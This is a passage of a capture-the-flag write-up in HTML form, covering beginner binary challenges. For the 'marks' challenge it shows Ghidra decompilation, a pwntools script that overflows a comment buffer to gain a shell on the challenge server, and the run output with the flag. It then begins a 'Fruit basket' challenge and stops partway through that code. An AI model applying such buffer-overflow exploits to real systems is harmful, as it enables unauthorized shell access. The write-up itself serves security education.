</span><span id=__span-13-24><a id=__codelineno-13-24 name=__codelineno-13-24 href=#__codelineno-13-24></a><span class=w>  </span><span class=n>m</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>r</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>75</span><span class=p>;</span>
</span><span id=__span-13-25><a id=__codelineno-13-25 name=__codelineno-13-25 href=#__codelineno-13-25></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;You got %d marks out of 100</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>m</span><span class=p>);</span>
</span><span id=__span-13-26><a id=__codelineno-13-26 name=__codelineno-13-26 href=#__codelineno-13-26></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Any Comments ?&quot;</span><span class=p>);</span>
</span><span id=__span-13-27><a id=__codelineno-13-27 name=__codelineno-13-27 href=#__codelineno-13-27></a><span class=w>  </span><span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&quot;%s&quot;</span><span class=p>,</span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-13-28><a id=__codelineno-13-28 name=__codelineno-13-28 href=#__codelineno-13-28></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Thanks !&quot;</span><span class=p>);</span>
</span><span id=__span-13-29><a id=__codelineno-13-29 name=__codelineno-13-29 href=#__codelineno-13-29></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>m</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>100</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-13-30><a id=__codelineno-13-30 name=__codelineno-13-30 href=#__codelineno-13-30></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Cool ! Here is your shell !&quot;</span><span class=p>);</span>
</span><span id=__span-13-31><a id=__codelineno-13-31 name=__codelineno-13-31 href=#__codelineno-13-31></a><span class=w>    </span><span class=n>system</span><span class=p>(</span><span class=s>&quot;/bin/sh&quot;</span><span class=p>);</span>
</span><span id=__span-13-32><a id=__codelineno-13-32 name=__codelineno-13-32 href=#__codelineno-13-32></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-13-33><a id=__codelineno-13-33 name=__codelineno-13-33 href=#__codelineno-13-33></a><span class=w>  </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-13-34><a id=__codelineno-13-34 name=__codelineno-13-34 href=#__codelineno-13-34></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Next time get 100/100 marks for shell :)&quot;</span><span class=p>);</span>
</span><span id=__span-13-35><a id=__codelineno-13-35 name=__codelineno-13-35 href=#__codelineno-13-35></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-13-36><a id=__codelineno-13-36 name=__codelineno-13-36 href=#__codelineno-13-36></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>local_10</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-13-37><a id=__codelineno-13-37 name=__codelineno-13-37 href=#__codelineno-13-37></a><span class=w>                    </span><span class=cm>/* WARNING: Subroutine does not return */</span>
</span><span id=__span-13-38><a id=__codelineno-13-38 name=__codelineno-13-38 href=#__codelineno-13-38></a><span class=w>    </span><span class=n>__stack_chk_fail</span><span class=p>();</span>
</span><span id=__span-13-39><a id=__codelineno-13-39 name=__codelineno-13-39 href=#__codelineno-13-39></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-13-40><a id=__codelineno-13-40 name=__codelineno-13-40 href=#__codelineno-13-40></a><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-13-41><a id=__codelineno-13-41 name=__codelineno-13-41 href=#__codelineno-13-41></a><span class=p>}</span>
</span></code></pre></div> <p>The goal here is to get 100 marks but as we can see, the highest we can get is 74. So, we have to overflow our comment buffer into the m variable in our stack. Once you get where our m variable is in the stack, it is pretty easy to write an exploit that will overflow our buf buffer into the marks m variable. Here is my solution:</p> <div class="language-python highlight"><pre><span></span><code><span id=__span-14-1><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=ch>#!/usr/bin/env python</span>
</span><span id=__span-14-2><a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a>
</span><span id=__span-14-3><a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span><span id=__span-14-4><a id=__codelineno-14-4 name=__codelineno-14-4 href=#__codelineno-14-4></a>
</span><span id=__span-14-5><a id=__codelineno-14-5 name=__codelineno-14-5 href=#__codelineno-14-5></a><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&quot;debug&quot;</span>
</span><span id=__span-14-6><a id=__codelineno-14-6 name=__codelineno-14-6 href=#__codelineno-14-6></a>
</span><span id=__span-14-7><a id=__codelineno-14-7 name=__codelineno-14-7 href=#__codelineno-14-7></a><span class=c1># p = process(&quot;./chal&quot;)</span>
</span><span id=__span-14-8><a id=__codelineno-14-8 name=__codelineno-14-8 href=#__codelineno-14-8></a><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&quot;34.70.212.151&quot;</span><span class=p>,</span> <span class=mi>8004</span><span class=p>)</span>
</span><span id=__span-14-9><a id=__codelineno-14-9 name=__codelineno-14-9 href=#__codelineno-14-9></a>
</span><span id=__span-14-10><a id=__codelineno-14-10 name=__codelineno-14-10 href=#__codelineno-14-10></a><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span><span id=__span-14-11><a id=__codelineno-14-11 name=__codelineno-14-11 href=#__codelineno-14-11></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;123&quot;</span><span class=p>)</span>
</span><span id=__span-14-12><a id=__codelineno-14-12 name=__codelineno-14-12 href=#__codelineno-14-12></a><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span><span id=__span-14-13><a id=__codelineno-14-13 name=__codelineno-14-13 href=#__codelineno-14-13></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;whoami&quot;</span><span class=p>)</span>
</span><span id=__span-14-14><a id=__codelineno-14-14 name=__codelineno-14-14 href=#__codelineno-14-14></a><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span><span id=__span-14-15><a id=__codelineno-14-15 name=__codelineno-14-15 href=#__codelineno-14-15></a><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;a&quot;</span> <span class=o>*</span> <span class=mi>68</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span>
</span><span id=__span-14-16><a id=__codelineno-14-16 name=__codelineno-14-16 href=#__codelineno-14-16></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span><span id=__span-14-17><a id=__codelineno-14-17 name=__codelineno-14-17 href=#__codelineno-14-17></a><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span><span id=__span-14-18><a id=__codelineno-14-18 name=__codelineno-14-18 href=#__codelineno-14-18></a><span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></code></pre></div> <div class="language-sh highlight"><pre><span></span><code><span id=__span-15-1><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a>backdoor/beginner/marks<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>!?<span class=o>]</span><span class=w> </span>via<span class=w> </span>🐍<span class=w> </span>v3.11.6
</span><span id=__span-15-2><a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a>❯<span class=w> </span>./sol.py
</span><span id=__span-15-3><a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a><span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./chal&#39;</span><span class=w> </span><span class=nv>argv</span><span class=o>=[</span>b<span class=s1>&#39;./chal&#39;</span><span class=o>]</span><span class=w> </span>:<span class=w> </span>pid<span class=w> </span><span class=m>118111</span>
</span><span id=__span-15-4><a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x38<span class=w> </span>bytes:
</span><span id=__span-15-5><a id=__codelineno-15-5 name=__codelineno-15-5 href=#__codelineno-15-5></a><span class=w>    </span>b<span class=s1>&#39;Enter your details to view your marks ...\n&#39;</span>
</span><span id=__span-15-6><a id=__codelineno-15-6 name=__codelineno-15-6 href=#__codelineno-15-6></a><span class=w>    </span>b<span class=s1>&#39;Roll Number : &#39;</span>
</span><span id=__span-15-7><a id=__codelineno-15-7 name=__codelineno-15-7 href=#__codelineno-15-7></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x4<span class=w> </span>bytes:
</span><span id=__span-15-8><a id=__codelineno-15-8 name=__codelineno-15-8 href=#__codelineno-15-8></a><span class=w>    </span>b<span class=s1>&#39;123\n&#39;</span>
</span><span id=__span-15-9><a id=__codelineno-15-9 name=__codelineno-15-9 href=#__codelineno-15-9></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x7<span class=w> </span>bytes:
</span><span id=__span-15-10><a id=__codelineno-15-10 name=__codelineno-15-10 href=#__codelineno-15-10></a><span class=w>    </span>b<span class=s1>&#39;Name : &#39;</span>
</span><span id=__span-15-11><a id=__codelineno-15-11 name=__codelineno-15-11 href=#__codelineno-15-11></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x7<span class=w> </span>bytes:
</span><span id=__span-15-12><a id=__codelineno-15-12 name=__codelineno-15-12 href=#__codelineno-15-12></a><span class=w>    </span>b<span class=s1>&#39;whoami\n&#39;</span>
</span><span id=__span-15-13><a id=__codelineno-15-13 name=__codelineno-15-13 href=#__codelineno-15-13></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x11<span class=w> </span>bytes:
</span><span id=__span-15-14><a id=__codelineno-15-14 name=__codelineno-15-14 href=#__codelineno-15-14></a><span class=w>    </span>b<span class=s1>&#39;Please Wait ...\n&#39;</span>
</span><span id=__span-15-15><a id=__codelineno-15-15 name=__codelineno-15-15 href=#__codelineno-15-15></a><span class=w>    </span>b<span class=s1>&#39;\n&#39;</span>
</span><span id=__span-15-16><a id=__codelineno-15-16 name=__codelineno-15-16 href=#__codelineno-15-16></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x4d<span class=w> </span>bytes:
</span><span id=__span-15-17><a id=__codelineno-15-17 name=__codelineno-15-17 href=#__codelineno-15-17></a><span class=w>    </span><span class=m>00000000</span><span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w>  </span>│aaaa│aaaa│aaaa│aaaa│
</span><span id=__span-15-18><a id=__codelineno-15-18 name=__codelineno-15-18 href=#__codelineno-15-18></a><span class=w>    </span>*
</span><span id=__span-15-19><a id=__codelineno-15-19 name=__codelineno-15-19 href=#__codelineno-15-19></a><span class=w>    </span><span class=m>00000040</span><span class=w>  </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>61</span><span class=w>  </span><span class=m>64</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>  </span>0a<span class=w>           </span>│aaaa│d···│····│·│
</span><span id=__span-15-20><a id=__codelineno-15-20 name=__codelineno-15-20 href=#__codelineno-15-20></a><span class=w>    </span>0000004d
</span><span id=__span-15-21><a id=__codelineno-15-21 name=__codelineno-15-21 href=#__codelineno-15-21></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
</span><span id=__span-15-22><a id=__codelineno-15-22 name=__codelineno-15-22 href=#__codelineno-15-22></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x50<span class=w> </span>bytes:
</span><span id=__span-15-23><a id=__codelineno-15-23 name=__codelineno-15-23 href=#__codelineno-15-23></a><span class=w>    </span>b<span class=s1>&#39;You got 21 marks out of 100\n&#39;</span>
</span><span id=__span-15-24><a id=__codelineno-15-24 name=__codelineno-15-24 href=#__codelineno-15-24></a><span class=w>    </span>b<span class=s1>&#39;Any Comments ?\n&#39;</span>
</span><span id=__span-15-25><a id=__codelineno-15-25 name=__codelineno-15-25 href=#__codelineno-15-25></a><span class=w>    </span>b<span class=s1>&#39;Thanks !\n&#39;</span>
</span><span id=__span-15-26><a id=__codelineno-15-26 name=__codelineno-15-26 href=#__codelineno-15-26></a><span class=w>    </span>b<span class=s1>&#39;Cool ! Here is your shell !\n&#39;</span>
</span><span id=__span-15-27><a id=__codelineno-15-27 name=__codelineno-15-27 href=#__codelineno-15-27></a>You<span class=w> </span>got<span class=w> </span><span class=m>21</span><span class=w> </span>marks<span class=w> </span>out<span class=w> </span>of<span class=w> </span><span class=m>100</span>
</span><span id=__span-15-28><a id=__codelineno-15-28 name=__codelineno-15-28 href=#__codelineno-15-28></a>Any<span class=w> </span>Comments<span class=w> </span>?
</span><span id=__span-15-29><a id=__codelineno-15-29 name=__codelineno-15-29 href=#__codelineno-15-29></a>Thanks<span class=w> </span>!
</span><span id=__span-15-30><a id=__codelineno-15-30 name=__codelineno-15-30 href=#__codelineno-15-30></a>Cool<span class=w> </span>!<span class=w> </span>Here<span class=w> </span>is<span class=w> </span>your<span class=w> </span>shell<span class=w> </span>!
</span><span id=__span-15-31><a id=__codelineno-15-31 name=__codelineno-15-31 href=#__codelineno-15-31></a>$<span class=w> </span>ls
</span><span id=__span-15-32><a id=__codelineno-15-32 name=__codelineno-15-32 href=#__codelineno-15-32></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x3<span class=w> </span>bytes:
</span><span id=__span-15-33><a id=__codelineno-15-33 name=__codelineno-15-33 href=#__codelineno-15-33></a><span class=w>    </span>b<span class=s1>&#39;ls\n&#39;</span>
</span><span id=__span-15-34><a id=__codelineno-15-34 name=__codelineno-15-34 href=#__codelineno-15-34></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x16<span class=w> </span>bytes:
</span><span id=__span-15-35><a id=__codelineno-15-35 name=__codelineno-15-35 href=#__codelineno-15-35></a><span class=w>    </span>b<span class=s1>&#39;chal  flag.txt\n&#39;</span>
</span><span id=__span-15-36><a id=__codelineno-15-36 name=__codelineno-15-36 href=#__codelineno-15-36></a>chal<span class=w>  </span>flag.txt
</span><span id=__span-15-37><a id=__codelineno-15-37 name=__codelineno-15-37 href=#__codelineno-15-37></a>$<span class=w> </span>cat<span class=w> </span>flag.txt
</span><span id=__span-15-38><a id=__codelineno-15-38 name=__codelineno-15-38 href=#__codelineno-15-38></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0xd<span class=w> </span>bytes:
</span><span id=__span-15-39><a id=__codelineno-15-39 name=__codelineno-15-39 href=#__codelineno-15-39></a><span class=w>    </span>b<span class=s1>&#39;cat flag.txt\n&#39;</span>
</span><span id=__span-15-40><a id=__codelineno-15-40 name=__codelineno-15-40 href=#__codelineno-15-40></a><span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x25<span class=w> </span>bytes:
</span><span id=__span-15-41><a id=__codelineno-15-41 name=__codelineno-15-41 href=#__codelineno-15-41></a><span class=w>    </span>b<span class=s1>&#39;flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}\n&#39;</span>
</span><span id=__span-15-42><a id=__codelineno-15-42 name=__codelineno-15-42 href=#__codelineno-15-42></a>flag<span class=o>{</span>Y0u_ju57_0v3rfl0wed_y0ur_m4rk5<span class=o>}</span>
</span></code></pre></div> <p>flag: <code>flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}</code></p> <hr> <h2 id=fruit-basket>Fruit basket<a class=headerlink href=#fruit-basket title="Permanent link">&para;</a></h2> <p>We were given a <a href=beginner/fruit_basket/chal>binary</a>. The binary when run, asks us to guess a fruit in it's basket.</p> <div class="language-sh highlight"><pre><span></span><code><span id=__span-16-1><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a>backdoor/beginner/fruit_basket<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>!?<span class=o>]</span><span class=w> </span>via<span class=w> </span>🐍<span class=w> </span>v3.11.6
</span><span id=__span-16-2><a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a>❯<span class=w> </span>./chal
</span><span id=__span-16-3><a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a>There<span class=w> </span>is<span class=w> </span>a<span class=w> </span>basket<span class=w> </span>full<span class=w> </span>of<span class=w> </span>fruits,<span class=w> </span>guess<span class=w> </span>the<span class=w> </span>fruit<span class=w> </span>which<span class=w> </span>I<span class=w> </span>am<span class=w> </span>holding<span class=w> </span>...
</span><span id=__span-16-4><a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a>This<span class=w> </span>seems<span class=w> </span>hard,<span class=w> </span>so<span class=w> </span>I<span class=w> </span>will<span class=w> </span>give<span class=w> </span>an<span class=w> </span>awesome<span class=w> </span>reward,<span class=w> </span>something<span class=w> </span>like<span class=w> </span>a<span class=w> </span>shell<span class=w> </span><span class=k>if</span><span class=w> </span>you<span class=w> </span>guess<span class=w> </span>all<span class=w> </span>the<span class=w> </span>fruits<span class=w> </span>right<span class=w> </span>:<span class=o>)</span>
</span><span id=__span-16-5><a id=__codelineno-16-5 name=__codelineno-16-5 href=#__codelineno-16-5></a>
</span><span id=__span-16-6><a id=__codelineno-16-6 name=__codelineno-16-6 href=#__codelineno-16-6></a>The<span class=w> </span>game<span class=w> </span>starts<span class=w> </span>now<span class=w> </span>!
</span><span id=__span-16-7><a id=__codelineno-16-7 name=__codelineno-16-7 href=#__codelineno-16-7></a><span class=m>1</span>
</span><span id=__span-16-8><a id=__codelineno-16-8 name=__codelineno-16-8 href=#__codelineno-16-8></a>Your<span class=w> </span>guess<span class=w> </span>:<span class=w> </span>mango
</span><span id=__span-16-9><a id=__codelineno-16-9 name=__codelineno-16-9 href=#__codelineno-16-9></a>Oops<span class=w> </span>!<span class=w> </span>Wrong<span class=w> </span>Guess<span class=w> </span>..
</span><span id=__span-16-10><a id=__codelineno-16-10 name=__codelineno-16-10 href=#__codelineno-16-10></a>No<span class=w> </span>shell<span class=w> </span><span class=k>for</span><span class=w> </span>you<span class=w> </span>:<span class=o>(</span>
</span></code></pre></div> <p>Let's look inside the binary with ghidra.</p> <div class="language-c highlight"><pre><span></span><code><span id=__span-17-1><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=cm>/* DISPLAY WARNING: Type casts are NOT being printed */</span>
</span><span id=__span-17-2><a id=__codelineno-17-2 name=__codelineno-17-2 href=#__codelineno-17-2></a>
</span><span id=__span-17-3><a id=__codelineno-17-3 name=__codelineno-17-3 href=#__codelineno-17-3></a><span class=n>undefined8</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-17-4><a id=__codelineno-17-4 name=__codelineno-17-4 href=#__codelineno-17-4></a>
</span><span id=__span-17-5><a id=__codelineno-17-5 name=__codelineno-17-5 href=#__codelineno-17-5></a><span class=p>{</span>
</span><span id=__span-17-6><a id=__codelineno-17-6 name=__codelineno-17-6 href=#__codelineno-17-6></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>r</span><span class=p>;</span>
</span><span id=__span-17-7><a id=__codelineno-17-7 name=__codelineno-17-7 href=#__codelineno-17-7></a><span class=w>  </span><span class=kt>time_t</span><span class=w> </span><span class=n>tVar1</span><span class=p>;</span>
</span><span id=__span-17-8><a id=__codelineno-17-8 name=__codelineno-17-8 href=#__codelineno-17-8></a><span class=w>  </span><span class=kt>size_t</span><span class=w> </span><span class=n>len</span><span class=p>;</span>
</span><span id=__span-17-9><a id=__codelineno-17-9 name=__codelineno-17-9 href=#__codelineno-17-9></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span><span id=__span-17-10><a id=__codelineno-17-10 name=__codelineno-17-10 href=#__codelineno-17-10></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
</span><span id=__span-17-11><a id=__codelineno-17-11 name=__codelineno-17-11 href=#__codelineno-17-11></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=w> </span><span class=p>[</span><span class=mi>12</span><span class=p>];</span>
</span><span id=__span-17-12><a id=__codelineno-17-12 name=__codelineno-17-12 href=#__codelineno-17-12></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>canary</span><span class=p>;</span>
</span><span id=__span-17-13><a id=__codelineno-17-13 name=__codelineno-17-13 href=#__codelineno-17-13></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>fruit</span><span class=p>;</span>
</span><span id=__span-17-14><a id=__codelineno-17-14 name=__codelineno-17-14 href=#__codelineno-17-14></a><span class=w>  </span><span class=kt>bool</span><span class=w> </span><span class=n>shell</span><span class=p>;</span>
</span><span id=__span-17-15><a id=__codelineno-17-15 name=__codelineno-17-15 href=#__codelineno-17-15></a>
</span><span id=__span-17-16><a id=__codelineno-17-16 name=__codelineno-17-16 href=#__codelineno-17-16></a><span class=w>  </span><span class=n>canary</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>);</span>
</span><span id=__span-17-17><a id=__codelineno-17-17 name=__codelineno-17-17 href=#__codelineno-17-17></a><span class=w>  </span><span class=n>tVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>time</span><span class=p>(</span><span class=mh>0x0</span><span class=p>);</span>
</span><span id=__span-17-18><a id=__codelineno-17-18 name=__codelineno-17-18 href=#__codelineno-17-18></a><span class=w>  </span><span class=n>srand</span><span class=p>(</span><span class=n>tVar1</span><span class=p>);</span>
</span><span id=__span-17-19><a id=__codelineno-17-19 name=__codelineno-17-19 href=#__codelineno-17-19></a><span class=w>  </span><span class=n>shell</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>true</span><span class=p>;</span>
</span><span id=__span-17-20><a id=__codelineno-17-20 name=__codelineno-17-20 href=#__codelineno-17-20></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;There is a basket full of fruits, guess the fruit which I am holding ...&quot;</span><span class=p>);</span>
</span><span id=__span-17-21><a id=__codelineno-17-21 name=__codelineno-17-21 href=#__codelineno-17-21></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span>
</span><span id=__span-17-22><a id=__codelineno-17-22 name=__codelineno-17-22 href=#__codelineno-17-22></a><span class=w>      </span><span class=s>&quot;This seems hard, so I will give an awesome reward, something like a shell if you guess all th e fruits right :)&quot;</span>
</span><span id=__span-17-23><a id=__codelineno-17-23 name=__codelineno-17-23 href=#__codelineno-17-23></a><span class=w>      </span><span class=p>);</span>
</span><span id=__span-17-24><a id=__codelineno-17-24 name=__codelineno-17-24 href=#__codelineno-17-24></a><span class=w>  </span><span class=n>usleep</span><span class=p>(</span><span class=mi>2000000</span><span class=p>);</span>
</span><span id=__span-17-25><a id=__codelineno-17-25 name=__codelineno-17-25 href=#__codelineno-17-25></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;</span><span class=se>\n</span><span class=s>The game starts now !&quot;</span><span class=p>);</span>
</span><span id=__span-17-26><a id=__codelineno-17-26 name=__codelineno-17-26 href=#__codelineno-17-26></a><span class=w>  </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-17-27><a id=__codelineno-17-27 name=__codelineno-17-27 href=#__codelineno-17-27></a><span class=w>  </span><span class=k>do</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-17-28><a id=__codelineno-17-28 name=__codelineno-17-28 href=#__codelineno-17-28></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=mi>49</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-17-29><a id=__codelineno-17-29 name=__codelineno-17-29 href=#__codelineno-17-29></a><span class=nl>LAB_001014ca</span><span class=p>:</span>
</span><span id=__span-17-30><a id=__codelineno-17-30 name=__codelineno-17-30 href=#__codelineno-17-30></a><span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>shell</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-17-31><a id=__codelineno-17-31 name=__codelineno-17-31 href=#__codelineno-17-31></a><span class=w>        </span><span class=n>system</span><span class=p>(</span><span class=s>&quot;/bin/sh&quot;</span><span class=p>);</span>
</span><span id=__span-17-32><a id=__codelineno-17-32 name=__codelineno-17-32 href=#__codelineno-17-32></a><span class=w>      </span><span class=p>}</span>
</span><span id=__span-17-33><a id=__codelineno-17-33 name=__codelineno-17-33 href=#__codelineno-17-33></a><span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>canary</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-17-34><a id=__codelineno-17-34 name=__codelineno-17-34 href=#__codelineno-17-34></a><span class=w>                    </span><span class=cm>/* WARNING: Subroutine does not return */</span>
</span><span id=__span-17-35><a id=__codelineno-17-35 name=__codelineno-17-35 href=#__codelineno-17-35></a><span class=w>        </span><span class=n>__stack_chk_fail</span><span class=p>();</span>
</span><span id=__span-17-36><a id=__codelineno-17-36 name=__codelineno-17-36 href=#__codelineno-17-36></a><span class=w>      </span><span class=p>}</span>
</span><span id=__span-17-37><a id=__codelineno-17-37 name=__codelineno-17-37 href=#__codelineno-17-37></a><span class=w>      </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-17-38><a id=__codelineno-17-38 name=__codelineno-17-38 href=#__codelineno-17-38></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-17-39><a id=__codelineno-17-39 name=__codelineno-17-39 href=#__codelineno-17-39></a><span class=w>    </span><span class=n>r</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rand</span><span class=p>();</span>
</span><span id=__span-17-40><a id=__codelineno-17-40 name=__codelineno-17-40 href=#__codelineno-17-40></a><span class=w>    </span><span class=n>fruit</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fruits</span><span class=p>[</span><span class=n>r</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>10</span><span class=p>];</span>
</span><span id=__span-17-41><a id=__codelineno-17-41 name=__codelineno-17-41 href=#__codelineno-17-41></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;%d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-17-42><a id=__codelineno-17-42 name=__codelineno-17-42 href=#__codelineno-17-42></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Your guess : &quot;</span><span class=p>);</span>
</span><span id=__span-17-43><a id=__codelineno-17-43 name=__codelineno-17-43 href=#__codelineno-17-43></a><span class=w>    </span><span class=n>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=n>stdin</span><span class=p>);</span>
